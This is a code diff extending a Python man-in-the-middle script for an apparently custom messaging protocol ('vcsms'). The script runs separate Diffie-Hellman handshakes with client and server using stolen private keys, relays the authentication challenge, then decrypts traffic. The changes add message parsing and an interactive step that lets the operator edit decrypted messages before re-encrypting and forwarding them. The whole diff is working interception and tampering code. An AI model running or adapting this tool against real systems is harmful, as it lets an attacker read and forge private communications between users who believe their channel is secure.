@@ -1,13 +1,24 @@
+#!/usr/bin/env python3
 import random
 import socket
 import threading
 import argparse
+import subprocess
+import os
+import sys
 
+sys.path.append("..")
 from vcsms.cryptography.exceptions import DecryptionFailureException
 from vcsms.server_connection import ServerConnection
 from vcsms.improved_socket import ImprovedSocket
+from vcsms.message_parser import MessageParser
 from vcsms.cryptography import dhke, sha256, utils, aes256
+from vcsms.client import OUTGOING_MESSAGE_TYPES
+from vcsms.client import INCOMING_MESSAGE_TYPES
 from vcsms import signing, keys
+
+MODIFY_LOCK = threading.Lock()
+MESSAGE_PARSER = MessageParser(INCOMING_MESSAGE_TYPES, OUTGOING_MESSAGE_TYPES, {})
 
 def forward(fsock: ImprovedSocket, tsock: ImprovedSocket):
     data = fsock.recv()
@@ -28,9 +39,9 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
         return (0, 0)
     print("Server sent diffie hellman public key")
     s_secret = dhke.calculate_shared_key(m_dh_privkey, s_dh_pubkey, dhke.group14_2048) 
-    s.send(hex(m_dh_pubkey)[2:].encode() + b':' + m_sig_c)
-    c.send(hex(m_dh_pubkey)[2:].encode() + b':' + m_sig_s)
-    c_dh_packet = c.recv()
+    s.send(hex(m_dh_pubkey)[2:].encode() + b':' + m_sig_c)  # diffie hellman key signed with client private
+    c.send(hex(m_dh_pubkey)[2:].encode() + b':' + m_sig_s)  # diffie hellman key signed with server private
+    c_dh_packet = c.recv()  # client sends difhel pub
     try:
         c_dh_pubkey = int(c_dh_packet.split(b':')[0], 16)
     except ValueError:
@@ -38,9 +49,9 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
         return (0, 0)
     print("Client sent diffie hellman public key")
     c_secret = dhke.calculate_shared_key(m_dh_privkey, c_dh_pubkey, dhke.group14_2048)
-    s_key = sha256.hash(utils.i_to_b(s_secret))
-    c_key = sha256.hash(utils.i_to_b(c_secret))
-    challenge = s.recv() 
+    s_key = sha256.hash(utils.i_to_b(s_secret))  # session key with server
+    c_key = sha256.hash(utils.i_to_b(c_secret))  # session key with client
+    challenge = s.recv()  # server sends encrypted challenge
     try:
         iv_hex, ciphertext_hex = challenge.split(b':')
         iv = int(iv_hex, 16)
@@ -54,14 +65,14 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
     except DecryptionFailureException:
         print("Failed to decrypt challenge")
         return (0, 0)
-    s.send(answer.hex().encode('utf-8'))
+    s.send(answer.hex().encode('utf-8'))  # i reply with decrypted challenge
     c_challenge = aes256.encrypt_cbc(answer, c_key, iv)
-    c.send(hex(iv)[2:].encode('utf-8') + b':' + c_challenge.hex().encode('utf-8'))
+    c.send(hex(iv)[2:].encode('utf-8') + b':' + c_challenge.hex().encode('utf-8'))  # i send challenge to client
     if s.recv() != b'OK':
         print("Server rejected challenge response")
         return (0, 0)
     print("Succeeded server challenge")
-    c_response = c.recv()
+    c_response = c.recv()  # client responds with challenge answer
     try:
         c_answer = bytes.fromhex(c_response.decode('utf-8'))
     except:
@@ -70,7 +81,7 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
     if c_answer != answer:
         print("Client failed challenge")
         return (0, 0)
-    c.send(b'OK')
+    c.send(b'OK')  # inform client they were correct
     print("Handshake completed successfully") 
     return (s_key, c_key)
 
@@ -81,9 +92,30 @@ def capture(f_sock: ImprovedSocket, t_sock: ImprovedSocket, f_enc_key: int, t_en
         iv = int(iv_hex, 16)
         ciphertext = bytes.fromhex(ciphertext_hex.decode('utf-8'))
         data = aes256.decrypt_cbc(ciphertext, f_enc_key, iv)
-        print(f'{direction}: {data}')
-        reencrypted = aes256.encrypt_cbc(data, t_enc_key, iv)
+        sender, message_type, parameters = MESSAGE_PARSER.parse_message(data)
+        print(f'MESSAGE OF TYPE {message_type} {direction} {sender}')
+        if input("Modify message data (y/N)? ").lower() == 'y':
+            modified = modify(data)
+        else:
+            modified = data
+        reencrypted = aes256.encrypt_cbc(modified, t_enc_key, iv)
         t_sock.send(iv_hex + b':' + reencrypted.hex().encode('utf-8'))
+
+def modify(data: bytes):
+    with MODIFY_LOCK:
+        with open("/tmp/interceptedmessage", 'wb+') as f:
+            f.write(data)
+        editor = os.environ["EDITOR"]
+        if "vi" in editor:
+            subprocess.run([editor, "-b", "/tmp/interceptedmessage"])
+        elif "nano" in editor:
+            subprocess.run([editor, "-LN", "/tmp/interceptedmessage"])
+        else:
+            subprocess.run([editor, "/tmp/interceptedmessage"])
+        with open("/tmp/interceptedmessage", 'rb') as f:
+            modified = f.read()
+        subprocess.run(["rm", "/tmp/interceptedmessage"])
+    return modified 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -115,7 +147,7 @@ if __name__ == "__main__":
     server_socket.connect(args.server_ip, args.server_port)
     server_socket.run()
     server_key, client_key = mitm_handshake(client_socket, server_socket, client_private_key, server_private_key)
-    s_to_c = threading.Thread(target=capture, args=(server_socket, client_socket, server_key, client_key, "Received"))
-    c_to_s = threading.Thread(target=capture, args=(client_socket, server_socket, client_key, server_key, "Sent"))
+    s_to_c = threading.Thread(target=capture, args=(server_socket, client_socket, server_key, client_key, "from"))
+    c_to_s = threading.Thread(target=capture, args=(client_socket, server_socket, client_key, server_key, "to"))
     s_to_c.start()
     c_to_s.start()
